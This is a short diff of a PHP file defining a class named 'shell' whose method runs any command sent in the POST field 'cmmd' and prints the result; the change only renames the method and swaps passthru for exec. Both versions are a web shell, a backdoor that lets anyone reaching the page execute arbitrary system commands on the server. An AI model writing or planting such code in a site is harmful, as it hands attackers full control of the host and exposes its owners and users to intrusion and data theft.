@@ -1,10 +1,10 @@
 <?php
 class shell{
-	function exesys()
+	function execute()
 	{
 		echo "<hr>";
 		echo "<pre>";
-		$result = passthru($_POST['cmmd']);
+		$result = exec($_POST['cmmd']);
 		echo "</pre>";
 		echo "<hr>";
 	}
